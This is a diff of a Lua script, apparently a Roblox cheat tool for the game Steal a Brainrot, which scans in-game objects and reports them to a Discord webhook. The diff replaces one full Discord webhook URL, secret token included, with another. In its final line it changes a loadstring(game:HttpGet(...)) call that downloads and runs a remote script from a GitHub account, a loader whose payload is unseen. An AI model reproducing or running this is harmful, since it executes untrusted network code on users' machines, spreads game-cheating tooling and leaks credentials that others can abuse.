@@ -1,3 +1,4 @@
+
 -- 🎯 BRAINROT INCOME SCANNER v2.0 (ИНДИВИДУАЛЬНЫЕ ПОРОГИ)
 -- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
 -- Запуск: автоматически при старте + по клавише F
@@ -8,7 +9,7 @@ local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
 local DEFAULT_THRESHOLD = 50_000_000 -- Порог по умолчанию
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1421494214570807481/uYgRF4vI6NEHNFF0tNmoG-wTOBypMlgTsRlmY_6qSkA4DxgTTCe70U7Cbv-kkTCoQOPz'
+local DISCORD_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1449338633218949201/0cC2kYc5bnPJ8LbQnFjTkuPSyl6B444DcnDwZjjxRGIm-r8B1ht96SUFjDOq1Cer1KzI'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
@@ -65,7 +66,6 @@ local OBJECTS = {
     ['Ginger Gerat'] = { emoji = '🌑', threshold = 10000000 },
     ['Jolly Jolly Sahur'] = { emoji = '🏴‍☠️', threshold = 100000000 },
     ['Money Money Reinted'] = { emoji = '🫰', threshold = 250000000 },
-    ['Skibidi Toilet'] = { emoji = '🪠', threshold = 0 },
 }
 
 -- 💰 ПАРСЕР ДОХОДА
@@ -591,4 +591,4 @@ print('📱 Discord webhook готов к отправке уведомлени�
 print('📁 Debris сканирование активно')
 
 -- Загрузка дополнительного скрипта
-loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/bottik.lua"))()
